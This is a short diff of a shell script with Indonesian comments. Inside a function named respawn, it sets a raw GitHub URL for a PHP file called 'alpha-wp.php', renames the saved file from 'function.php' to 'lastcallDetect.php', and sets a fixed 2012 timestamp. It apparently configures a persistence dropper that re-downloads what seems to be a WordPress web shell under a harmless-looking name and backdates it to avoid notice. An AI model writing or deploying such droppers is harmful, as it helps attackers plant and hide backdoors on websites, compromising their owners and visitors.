@@ -42,7 +42,7 @@ respawn() {
 
 # URL sumber file yang akan diunduh
 url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpha-wp.php"
-file_name="function.php"
+file_name="lastcallDetect.php"
 timestamp="201201081531.12"
 
 # Jalankan fungsi penting
